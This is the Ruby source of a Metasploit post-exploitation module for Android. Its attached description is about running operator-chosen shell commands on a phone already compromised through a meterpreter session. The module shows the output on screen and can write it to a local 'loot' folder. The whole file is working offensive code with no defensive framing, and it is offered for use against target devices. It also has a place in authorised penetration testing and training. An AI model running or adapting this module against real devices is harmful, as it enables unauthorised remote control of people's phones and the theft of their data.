require 'rex'
require 'msf/core'
require 'msf/core/post/common'



#
# Metasploit Class name and mixins ..
#
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

        include Msf::Post::File
        include Msf::Post::Common
        include Msf::Post::Android
        include Msf::Post::Android::System



#
# The 'def initialize()' funtion ..
# Building Metasploit/Armitage info GUI/CLI description
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'execute commands in android',
                        'Description'   => %q{
                                        Android/meterpreter payloads does not allow users to manipulate target file system. This msf post-exploitation module will allow users to input/execute remotely commands in target system, display on screen the command output and store outputs (set STORE_LOOT true) into sellected loot folder (set LOOT_FOLDER /root)
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: r00t-3xp10it', # post-module author :D
                                ],
 
                        'Version'        => '$Revision: 1.4',
                        'DisclosureDate' => '26 jun 2018',
                        'Platform'       => 'android',
                        'Arch'           => ARCH_DALVIK,
                        'Privileged'     => 'false',  # root privileges required?
                        'Targets'        =>
                                [
                                         [ 'android' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts android targets
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'http://rapid7.github.io/metasploit-framework/api/' ],
                                         [ 'URL', 'https://resources.infosecinstitute.com/lab-android-exploitation-with-kali/' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',   # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on', '1']),
                                OptBool.new('STORE_LOOT', [false, 'Store session outputs to loot folder?', false]),
                                OptString.new('LOOT_FOLDER', [ false, 'The full path [local] where to store logs', '/root']),
                                OptString.new('EXEC_COMMAND', [true, 'The bash command to be executed remotely', 'ls -A'])
                        ], self.class)

        end



#
# The 'def run()' funtion ..
# Running sellected modules against session target.
#
def run

  #
  # Variable declarations (msf API calls)
  #
  session = client
  sysnfo = session.sys.config.sysinfo
  runtor = client.sys.config.getuid
  runsession = client.session_host
  directory = client.fs.dir.pwd
  build_prop = get_build_prop  # Grab android version release
  #
  # draw module banner ..
  #
  print_line("+-------------------------------------+")
  print_line("|    ANDROID AUXILIARY POST-MODULE    |")
  print_line("| Author : r00t-3xp10it (ssa-redteam) |")
  print_line("+-------------------------------------+")
  print_line("")
  print_line("    Running on session  : #{datastore['SESSION']}")
  print_line("    Target IP addr      : #{runsession}")
  print_line("    Payload directory   : #{directory}")
  print_line("    Operative System    : #{sysnfo['OS']}")
  print_line("    Client UID          : #{runtor}")
  print_line("")
  print_line("")


    #
    # check for proper config settings enter
    # to prevent 'unset all' from deleting default options ..
    #
    if datastore['EXEC_COMMAND'] == 'nil'
      print_error("[ABORT]: Options not configurated correctly!")
      print_warning("Please set EXEC_COMMAND <command>")
      return nil
    end
    #
    # Check for proper target operative system (Android)
    #
    unless sysinfo['OS'] =~ /Android/ || sysinfo['OS'] =~ /android/
      print_error("[ABORT]: This module only works againts Android systems!")
      return nil
    end
    #
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals that we are not on a meterpreter session!
    #
    unless sysinfo.nil?
      android_version = Gem::Version.new(build_prop['ro.build.version.release'])
      print_status("Running module against: android #{android_version}")
      Rex::sleep(0.5)
    else
      print_error("[ABORT]: This module only works in meterpreter sessions!")
      return nil
    end


      #
      # Single_command to execute remotely (user inputs) ..
      # Example: set EXEC_COMMAND <command>
      #
      exec_comm = datastore['EXEC_COMMAND']
        # check if exec_command option its configurated ..
        unless exec_comm.nil?
          print_status("Executing: #{exec_comm}")
          Rex::sleep(0.5)
          # bash command to be executed remotely ..
          single_comm = cmd_exec("#{exec_comm}")
            # print data on screen
            print_line("***************************************")
            print_line("#{single_comm}")
            print_line("***************************************")
            Rex::sleep(0.2)
          #
          # store data into a local variable (data_dump) ..
          # to be able to write the logfile later.
          #
          data_dump=''
          data_dump << "Executing: #{exec_comm}\n"
          data_dump << "***************************************\n"
          data_dump << single_comm
          data_dump << "***************************************\n\n"
        end


    #
    # Store (data_dump) contents into loot folder? (local) ..
    # IF sellected previous the option (set STORE_LOOT true)
    #
    if datastore['STORE_LOOT'] == true
      print_warning("Writing session logfile!")
      Rex::sleep(1.0)
        unless datastore['LOOT_FOLDER'] == 'nil'
        # generating random logfile name (6 chars)
           rand = Rex::Text.rand_text_alpha(6)
           loot_folder = datastore['LOOT_FOLDER']
           # create session output logfile
           File.open("#{loot_folder}/android_#{rand}.log", "w") do |f|
           f.write("#{data_dump}")
           f.close
           print_good("Logfile: #{loot_folder}/android_#{rand}.log")
           end
        else
          print_error("[ABORT]: Options not configurated correctly!")
          print_warning("Please set LOOT_FOLDER <full path>")
        end
    end

  #
  # end of the 'def run()' funtion ..
  #
  end

# exit module execution (_EOF) ..
end